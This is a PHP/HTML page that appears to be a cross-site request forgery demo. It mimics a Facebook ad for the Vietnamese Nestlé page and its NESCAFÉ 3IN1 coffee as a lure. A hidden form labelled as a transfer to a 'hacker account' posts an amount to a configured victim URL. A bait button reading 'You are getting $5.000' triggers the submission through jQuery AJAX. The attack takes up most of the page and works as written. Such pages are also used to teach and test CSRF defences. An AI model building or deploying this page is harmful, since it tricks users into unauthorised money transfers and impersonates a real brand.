<?php 
    require __DIR__ . '/config/config.php';
?>

<div>
    <div class="x1vqgdyp x1n2onr6 x100vrsf"><object type="nested/pressable">
        <a aria-label="Gia Đình Nestlé"  href="https://www.facebook.com/giadinhnestle?__cft__[0]=AZVs8du2UzRHFwW5I3ZRT3IgFDMM-rTGGhW1TZTfJDfUsQs8P2kzFy_G1KL0BFE-14QzbUtr-mCbmFFecUTmDqVVrUA4RfqFokOk3P2adztseAXlzFFSSAoZCmFNn9qu3ELJB2iAFNlIo8BWSTbm2XpertV8NZDqopI432ISjUgUdt2j2rCOywtgZdvT2HoZNCDrE2uOxcBRoIJoPi2wubHLsWpOoE1abmepK_xR2i43AM1MF-Is_tj6TYWua1tAWhoQl6tDcW9sRWElNKg4ybgh&amp;__tn__=%3C%3C%2CP-R" role="link" tabindex="0">
        <div>
            <mask id=":r2k:">
                <circle cx="20" cy="20" fill="white" r="20"></circle>
                <circle cx="34" cy="34" data-visualcompletion="ignore" fill="black" r="6.5"></circle>
            </mask>
                <image x="0" y="0" height="100%" preserveAspectRatio="xMidYMid slice" width="100%" xlink:href="https://scontent.fsgn2-3.fna.fbcdn.net/v/t39.30808-1/297487357_5525311777507238_9026984584226186491_n.jpg?stp=cp0_dst-jpg_p40x40&amp;_nc_cat=1&amp;ccb=1-7&amp;_nc_sid=5f2048&amp;_nc_ohc=EsBntYVS1iAAX_xlpgw&amp;_nc_ht=scontent.fsgn2-3.fna&amp;oh=00_AfC5TxZpmKTPsQYKapIxoHBcGAJioC_GJ-TqubbP9TNcTw&amp;oe=655223FA" style="height: 40px; width: 40px;">
                </image>
            <div>Đang hoạt động</div>
        </div>

        <a href="https://www.facebook.com/giadinhnestle?__cft__[0]=AZVs8du2UzRHFwW5I3ZRT3IgFDMM-rTGGhW1TZTfJDfUsQs8P2kzFy_G1KL0BFE-14QzbUtr-mCbmFFecUTmDqVVrUA4RfqFokOk3P2adztseAXlzFFSSAoZCmFNn9qu3ELJB2iAFNlIo8BWSTbm2XpertV8NZDqopI432ISjUgUdt2j2rCOywtgZdvT2HoZNCDrE2uOxcBRoIJoPi2wubHLsWpOoE1abmepK_xR2i43AM1MF-Is_tj6TYWua1tAWhoQl6tDcW9sRWElNKg4ybgh&amp;__tn__=-UC%2CP-R" role="link" tabindex="0">
            <strong><span>Gia Đình Nestlé</span></strong>
        </a>

        <svg viewBox="0 0 12 13" width="1em" height="1em" fill="currentColor" title="Tài khoản đã xác minh">
            <title>Tài khoản đã xác minh</title>
        </svg>


        <title>Đã chia sẻ với Công khai</title>

        <img alt="Image" style="width: 100px; height: 100px;"  src="https://scontent.fsgn2-6.fna.fbcdn.net/v/t58.17529-6/105726205_1506115230179714_171167456346306739_n.jpg?_nc_cat=111&amp;ccb=1-7&amp;_nc_sid=e52215&amp;_nc_ohc=8NwK9PqDQe0AX95KbtR&amp;_nc_ht=scontent.fsgn2-6.fna&amp;oh=00_AfDwZxAjamzBwPCy3MoH9kercOF8Dk8FUTkaU11EcUIZKQ&amp;oe=654E28FA">

        <div>
            <div>
                <div>
                    <span>
                        <span class="x1lliihq x6ikm8r x10wlt62 x1n2onr6" style="-webkit-box-orient: vertical; -webkit-line-clamp: 2; display: -webkit-box;">
                            <div id=":r2v:">Cà phê hoà tan NESCAFÉ 3IN1 </div>
                        </span>
                    </span>
                </div>
                <div class="xu06os2 x1ok221b">
                    <span dir="auto">
                        <span>391.000 ₫</span>
                    </span>
                </div>
            </div>
        </div>
    </div>
</div>


<div>
    <input type="button" id="btn" class="btn btn-default" name="hideOrShow" value="Show/Hide">
</div>

<div id="div-hidden-transfer">
    <p>
        <div style="padding-left: 30px;">
            <div>Form transfer hacker attach in xsrf link</div>
            <div>
                <form id="transfer-form" name="transfer-form" action="<?php echo $victimUrl;?>" method="POST">
                    <div>
                        Transfer to hacker account:
                    </div>

                    <div>
                        <input type="text" name="amount" value="10000">
                        <input type="submit">
                    </div>
                </form>
            </div>
        </div>
    </p>
</div>

<p>
    <div>
        <button class="get-gift button" style="padding: 20px; color: red; background: yellow;" 
            id="transfer-btn">You are getting $5.000</button>
    </div>
</p>


<script src="jquery.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
    $('#transfer-btn').click(function() {
        $("#transfer-form").submit();
        //window.location.replace('<?php echo $originUrl;?>');
    });

    $('#transfer-form').submit(function(e){
        var url = $(this).attr('action');
        $.ajax({
            url: url,
            data : $(this).serialize(),
            headers: {
                "Access-Control-Allow-Origin": '*', 
            },
            success : function (data){
                alert('success');
            }
        });
    });

    $("#div-hidden-transfer").hide();

    $( "input[name=hideOrShow]" ).on( "focus blur", function() {
        if($(this).is( ":focus" ) ){
            $("#div-hidden-transfer").show();
        }else{
            $("#div-hidden-transfer").hide();
        }
    });
});
</script>


<style type="text/css">
    .get-gift:hover {
      background-color: #04AA6D;
      color: white;
    }
    .button {
      background-color: #04AA6D; /* Green */
      border: none;
      color: white;
      padding: 16px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      transition-duration: 0.4s;
      cursor: pointer;
    }
</style>




